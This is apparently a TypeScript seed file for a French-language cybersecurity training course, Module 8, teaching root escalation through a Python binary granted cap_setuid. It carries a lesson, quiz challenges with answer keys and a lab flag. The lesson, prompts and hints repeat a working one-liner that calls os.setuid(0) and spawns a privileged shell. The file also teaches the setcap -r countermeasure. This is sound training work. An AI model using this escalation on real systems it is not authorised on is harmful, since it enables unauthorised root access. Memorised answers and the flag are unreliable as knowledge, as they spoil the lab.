import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 8 : élévation de privilèges via capacités Linux. Lab mono-conteneur. */
export const module8CapabilitiesPrivesc: CourseSeed[] = [
  {
    slug: "prat-capabilities-privesc",
    title: "Élévation de privilèges via capacités Linux",
    checkpoint: "prat-privesc-lateral",
    codename: "Silent Grant",
    domain: "Élévation de privilèges",
    theme: "grid",
    icon: "Cpu",
    accent: "#4F9DA6",
    order: 8,
    difficulty: "hard",
    summary:
      "Huitième lab réel, troisième voie vers root : ni SUID (Module 3), ni cron (Module 5), mais les capacités Linux. Un privilège précis — cap_setuid — a été accordé à l'interpréteur Python. Un simple os.setuid(0) suffit alors à devenir root.",
    objectives: [
      "Découvrir les capacités Linux, un contrôle de privilège plus fin que le SUID",
      "Chercher les capacités anormales sur un système (getcap -r /)",
      "Comprendre ce que permet cap_setuid",
      "Exploiter cap_setuid sur Python pour obtenir un shell root",
      "Relier SUID, cron et capacités : trois formes du même défaut",
    ],
    sandbox: {
      attackerImage: "cyberace/module8-capabilities-lab:latest",
      // targetImage absent — mode mono-conteneur.
      ttlSec: 1200,
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# ⚙️ Élévation de privilèges via capacités Linux — Silent Grant

Troisième module d'élévation de privilèges, **troisième mécanisme**. Le Module 3 exploitait le **bit SUID** (tout ou rien), le Module 5 une **tâche cron** mal cloisonnée. Ici, on exploite les **capacités Linux** — un système **plus fin**, mais tout aussi dangereux mal utilisé. 🏎️

---

## 🧭 Le briefing

> Comme au Module 3, tu disposes d'un accès **\`stagiaire\`**. Mais cette fois, **aucun binaire SUID suspect** ne traîne — \`find / -perm -4000\` ne donnera rien d'intéressant. **Cherche ailleurs.** Le privilège de trop se cache dans un mécanisme plus discret.

**Comment jouer :** « Démarrer le lab », shell **\`stagiaire\`**. Énumère autrement, trouve la faille, deviens root.

---

## 1. Les capacités Linux : le SUID en plus fin 🎛️

Historiquement, sous UNIX, un programme est soit **normal**, soit **tout-puissant** (root, souvent via le **bit SUID**). C'est **binaire** et **dangereux** : un binaire SUID-root a **tous** les privilèges de root, alors qu'il n'en aurait besoin que d'**un seul**.

Les **capacités** (*Linux capabilities*) découpent les pouvoirs de root en **~40 privilèges distincts**, attribuables **un par un** à un exécutable. Exemples :
- **\`cap_net_bind_service\`** : ouvrir un port < 1024 (sans être root).
- **\`cap_net_raw\`** : forger des paquets bruts (ce que \`ping\`/\`nmap -sS\` utilisent).
- **\`cap_dac_override\`** : ignorer les permissions de fichiers.
- **\`cap_setuid\`** : **changer son UID**, y compris devenir **root (UID 0)**.

L'idée est **saine** : donner à un programme **juste** le privilège dont il a besoin, au lieu de tout root. **Mais** accorder une capacité **trop puissante** (comme \`cap_setuid\`) à un programme **flexible** (comme un interpréteur) revient à **rouvrir la porte de root** — en plus discret qu'un SUID.

---

## 2. Chasser les capacités anormales 🔍

Les binaires SUID se listent avec \`find -perm -4000\` ; les **capacités**, elles, se listent avec **\`getcap\`** :

\`\`\`bash
getcap -r / 2>/dev/null
#       │  └── 2>/dev/null : masque les erreurs de permission (bruit)
#       └── -r : parcourt récursivement tout le système de fichiers
\`\`\`

La sortie liste chaque fichier portant une capacité, ex. :
\`\`\`
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep      ← ANORMAL !
\`\`\`

Certaines capacités sont **légitimes** (\`ping\` a \`cap_net_raw\`). Mais un **interpréteur** (\`python3\`) avec **\`cap_setuid\`** ne l'est **jamais** : sa **seule présence** dans cette liste est le signal d'alarme.

> 🧭 Retiens le **nom générique \`python3\`**, pas un chemin versionné (\`python3.11\`) : la version peut changer selon l'image, mais le principe reste. La capacité est posée sur le **vrai binaire** (le lien \`python3\` pointe dessus).

---

## 3. Exploiter cap_setuid sur Python 💥

**\`cap_setuid\`** autorise le processus à **changer son UID effectif** — y compris vers **0 (root)**. Or Python peut appeler \`setuid\` directement. L'exploitation tient en une ligne :

\`\`\`bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
\`\`\`

Décorticage :
- \`os.setuid(0)\` : grâce à \`cap_setuid\`, Python passe son **UID à 0** → il devient **root**.
- \`os.system("/bin/bash -p")\` : lance un shell **root**. Le **\`-p\`** (comme au Module 3) empêche bash d'**abandonner** les privilèges effectifs qu'il vient d'obtenir.

Puis on lit le trophée :
\`\`\`bash
whoami           # root
cat /root/flag.txt
\`\`\`

---

## 4. Le fil rouge des trois élévations 🧵

Tu as maintenant vu **trois** chemins vers root, tous fondés sur **le même défaut** :

| Module | Mécanisme | Le privilège de trop est sur… |
|---|---|---|
| **3** | bit **SUID** | un **binaire** (\`find\`) exécuté avec les droits du propriétaire (root) |
| **5** | **cron** | un **script** root **modifiable** par l'utilisateur |
| **8** | **capacité** | un **interpréteur** (\`python3\`) doté de \`cap_setuid\` |

> 🧠 Point commun : **un privilège élevé accordé à quelque chose que l'utilisateur limité peut détourner ou déclencher.** Le SUID est radical (tout root), la capacité est censée être fine (un seul pouvoir) — mais une capacité **mal choisie** (\`cap_setuid\`) est **aussi grave** qu'un SUID. La leçon défensive : **moindre privilège**, et auditer **SUID, cron ET capacités**.

---

## 5. La contre-mesure 🛡️

Pour retirer une capacité accordée en trop à un binaire :

\`\`\`bash
setcap -r /usr/bin/python3.11
# (-r = remove : enlève TOUTES les capacités du fichier)
\`\`\`

Et surtout : ne **jamais** accorder \`cap_setuid\` (ni \`cap_setgid\`, \`cap_dac_override\`…) à un **interpréteur** ou un outil polyvalent — ces capacités « fortes » n'ont de sens que sur des binaires **dédiés et audités**.

---

## 🎯 Ta mission (résumé)

1. \`id\` (qui suis-je), puis **\`getcap -r / 2>/dev/null\`** (chasse aux capacités).
2. Repère **\`python3\`** avec **\`cap_setuid\`**.
3. \`python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'\` → root → **flag**.

## 🧠 À retenir

- Les **capacités Linux** découpent les pouvoirs de root en privilèges **distincts** (\`cap_net_raw\`, \`cap_setuid\`…), attribuables **un par un** à un exécutable — plus **fin** que le SUID (tout ou rien).
- Lister : **\`getcap -r / 2>/dev/null\`**. Une capacité **forte** sur un **interpréteur** (\`python3\` + \`cap_setuid\`) est **anormale** → signal d'élévation.
- **\`cap_setuid\`** = changer son UID, y compris devenir **root (0)**. Exploit : \`python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'\` (le **\`-p\`** garde les privilèges).
- **Fil rouge SUID / cron / capacités** : à chaque fois, **un privilège élevé accordé à quelque chose que l'utilisateur limité peut détourner**. Défense : **moindre privilège** + audit des trois.
- **Contre-mesure** : **\`setcap -r <binaire>\`** retire les capacités ; ne jamais donner de capacité forte à un outil polyvalent.`,
    badge: {
      id: "badge-prat-capabilities",
      name: "Chasseur de Capacités",
      icon: "Cpu",
      description: "A trouvé la capacité Linux oubliée qui menait à root.",
    },
    challenges: [
      {
        id: "prat-capabilities-t1",
        title: "Qui suis-je ?",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## 🪪 Point de départ

Démarre le lab (shell \`stagiaire\`) et fais le point sur ton identité :

\`\`\`bash
id
\`\`\`

**Question :** quelle **commande** affiche l'UID, le GID et les groupes de l'utilisateur courant ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        answer: "id",
        caseSensitive: false,
        explanation: `**\`id\`** confirme que tu es **\`stagiaire\`**, sans privilège particulier. Contrairement au Module 3, il n'y a **pas** de binaire SUID suspect ici — il faut chercher la faille dans un autre mécanisme : les **capacités**.`,
        tags: ["capabilities", "enumeration", "id"],
      },
      {
        id: "prat-capabilities-t2",
        title: "Chercher les capacités spéciales",
        order: 2,
        difficulty: "medium",
        type: "text",
        prompt: `## 🔍 Chasse aux capacités

Les binaires SUID se listent avec \`find -perm -4000\` ; les **capacités** se listent autrement :

\`\`\`bash
getcap -r / 2>/dev/null
\`\`\`

Regarde la liste : certaines capacités sont légitimes (\`ping\` a \`cap_net_raw\`), mais **un interpréteur** n'a **aucune** raison d'en porter une puissante.

**Question :** quel **interpréteur** (nom générique, **sans version précise**) possède une capacité qui ne devrait normalement pas lui être accordée ?`,
        points: 150,
        timeLimitSec: 400,
        hints: [
          { text: "La plupart des systèmes Linux n'accordent AUCUNE capacité spéciale à Python par défaut — sa seule présence dans la liste getcap est le signal.", cost: 20 },
        ],
        answer: "python3",
        accept: ["python", "python 3", "python3.11"],
        caseSensitive: false,
        explanation: `**\`python3\`** apparaît dans la sortie de \`getcap\` avec **\`cap_setuid\`** — totalement anormal pour un interpréteur. Un outil aussi **flexible** doté du pouvoir de **changer d'UID** est une porte ouverte vers root. (Le chemin exact peut être versionné, ex. \`python3.11\`, mais c'est bien Python.)`,
        tags: ["capabilities", "getcap", "python"],
      },
      {
        id: "prat-capabilities-t3",
        title: "Comprendre les capacités Linux",
        order: 3,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🎛️ cap_setuid

**Question :** que permet la capacité **\`cap_setuid\`** à un processus qui la possède ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Changer son UID effectif, y compris devenir root (UID 0), sans être root au départ",
          "Se connecter à Internet sans restriction",
          "Monter des systèmes de fichiers",
          "Lire la mémoire d'autres processus",
        ],
        answer: 0,
        explanation: `**\`cap_setuid\`** autorise le processus à **changer son UID**, jusqu'à **0 (root)** — sans être root au départ. C'est exactement le pouvoir qu'un attaquant recherche. (Se connecter au réseau relèverait de \`cap_net_*\`, monter des FS de \`cap_sys_admin\`, lire la mémoire d'autrui de \`cap_sys_ptrace\`.)`,
        tags: ["capabilities", "cap_setuid", "uid"],
      },
      {
        id: "prat-capabilities-t4",
        title: "Exploiter (flag)",
        order: 4,
        difficulty: "hard",
        type: "text",
        prompt: `## 💥 Devenir root (flag)

Python porte \`cap_setuid\` : il peut donc passer son UID à 0. Exploite-le :

\`\`\`bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
whoami        # doit afficher root
cat /root/flag.txt
\`\`\`

**Question :** colle le **flag** contenu dans \`/root/flag.txt\`.`,
        points: 250,
        timeLimitSec: 600,
        hints: [
          { text: "Python peut appeler os.setuid(0) grâce à cap_setuid, puis lancer un shell : import os; os.setuid(0); os.system(...).", cost: 20 },
          { text: "Commande exacte : python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'  puis  cat /root/flag.txt", cost: 35 },
        ],
        answer: "CYBERACE{capability_setuid_python_racine}",
        caseSensitive: true,
        explanation: `Grâce à **\`cap_setuid\`**, \`os.setuid(0)\` fait passer Python **root**, et \`os.system("/bin/bash -p")\` ouvre un **shell root** (le \`-p\` garde les privilèges). Tu lis alors \`/root/flag.txt\` → \`CYBERACE{capability_setuid_python_racine}\`. Une seule capacité mal placée a suffi.`,
        tags: ["capabilities", "exploitation", "flag"],
      },
      {
        id: "prat-capabilities-t5",
        title: "Pourquoi -p, encore",
        order: 5,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🧩 Le rôle du -p

**Question :** pourquoi ajoute-t-on **\`-p\`** à \`/bin/bash\` dans cette exploitation, comme au Module 3 ?`,
        points: 100,
        timeLimitSec: 250,
        hints: [],
        options: [
          "Il empêche bash d'abandonner automatiquement les privilèges effectifs qu'il vient d'obtenir",
          "Il active le mode silencieux",
          "Il précise le chemin du binaire",
          "Il désactive l'historique des commandes",
        ],
        answer: 0,
        explanation: `Par sécurité, \`bash\` **abandonne** par défaut les privilèges effectifs élevés à son démarrage. Le **\`-p\`** (*privileged*) l'en empêche → le shell **conserve** les droits root obtenus via \`os.setuid(0)\`. C'est le même réflexe qu'au Module 3 (SUID find).`,
        tags: ["capabilities", "bash-p", "privileges"],
      },
      {
        id: "prat-capabilities-t6",
        title: "Comparer avec le SUID",
        order: 6,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🔬 Capacité vs SUID

**Question :** en quoi ce mécanisme **diffère-t-il** du bit SUID vu au Module 3 ?`,
        points: 150,
        timeLimitSec: 350,
        hints: [],
        options: [
          "Les capacités accordent un privilège précis et limité (ex: changer d'UID) sans donner tous les droits root du binaire entier, contrairement au SUID, plus radical",
          "Les capacités sont exactement équivalentes au SUID, seul le nom change",
          "Les capacités ne fonctionnent que sur les scripts, jamais sur les binaires",
          "Les capacités nécessitent toujours un mot de passe, contrairement au SUID",
        ],
        answer: 0,
        explanation: `Les **capacités** découpent root en privilèges **distincts** et en accordent **un seul** à la fois (principe du moindre privilège), alors que le **SUID** donne **tout** root d'un coup. Ici pourtant, \`cap_setuid\` est si puissante qu'elle équivaut à un SUID — d'où le danger d'une capacité **mal choisie**.`,
        tags: ["capabilities", "suid", "comparaison"],
      },
      {
        id: "prat-capabilities-t7",
        title: "Contre-mesure",
        order: 7,
        difficulty: "medium",
        type: "text",
        prompt: `## 🛡️ Retirer la capacité

**Question :** quelle **commande** permet de **retirer** une capacité accordée en trop à un binaire ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        answer: "setcap -r",
        accept: ["setcap -r <binaire>", "setcap -r /usr/bin/python3.11", "setcap", "setcap -r python3"],
        caseSensitive: false,
        explanation: `**\`setcap -r <binaire>\`** retire **toutes** les capacités d'un fichier (\`-r\` = remove). Ici, \`setcap -r\` sur le binaire Python neutraliserait la faille. Règle : ne jamais poser de capacité **forte** (\`cap_setuid\`…) sur un **interpréteur** ou un outil polyvalent.`,
        tags: ["capabilities", "setcap", "contre-mesure"],
      },
      {
        id: "prat-capabilities-t8",
        title: "Synthèse",
        order: 8,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🧵 Le fil rouge

**Question :** sur les **trois** modules d'élévation de privilèges vus jusqu'ici (SUID, cron, capacités), quel est le **point commun** ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        options: [
          "Un privilège élevé accordé à quelque chose (binaire, script, tâche) que l'utilisateur limité peut détourner ou déclencher",
          "Les trois nécessitent une connexion réseau",
          "Les trois exploitent une faille du noyau Linux",
          "Les trois nécessitent de connaître un mot de passe root",
        ],
        answer: 0,
        explanation: `Le dénominateur commun : **un privilège élevé posé sur quelque chose que l'utilisateur limité peut détourner ou déclencher** — un binaire SUID (Module 3), un script cron modifiable (Module 5), un interpréteur doté d'une capacité (Module 8). Aucun ne requiert de faille noyau, de réseau ou de mot de passe root : juste une **mauvaise attribution de privilège**.`,
        tags: ["capabilities", "synthese", "moindre-privilege"],
      },
    ],
  },
];
